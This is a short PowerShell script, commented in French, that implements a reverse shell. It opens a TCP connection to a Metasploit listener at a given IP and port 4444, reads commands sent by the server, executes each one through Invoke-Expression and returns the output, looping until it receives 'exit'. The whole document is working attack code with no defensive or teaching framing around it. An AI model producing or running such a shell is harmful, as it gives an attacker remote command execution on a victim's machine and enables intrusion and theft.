# Définir l'IP et le port du serveur Metasploit
$server = "172.28.137.218"   # Remplacez par l'IP de votre serveur Metasploit
$port = 4444                  # Remplacez par le port que vous avez configuré dans Metasploit

# Créer un client TCP et établir la connexion
$client = New-Object System.Net.Sockets.TCPClient($server, $port)
$stream = $client.GetStream()

# Créer des flux de lecture et d'écriture pour communiquer avec le serveur
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

# Lire les commandes envoyées par le serveur et les exécuter
while ($true) {
    $writer.Write("PS > ")
    $cmd = $reader.ReadLine()

    if ($cmd -eq "exit") { break }

    # Exécuter la commande reçue et retourner la sortie
    $output = Invoke-Expression $cmd 2>&1
    $writer.WriteLine($output)
}

# Fermer la connexion
$client.Close()
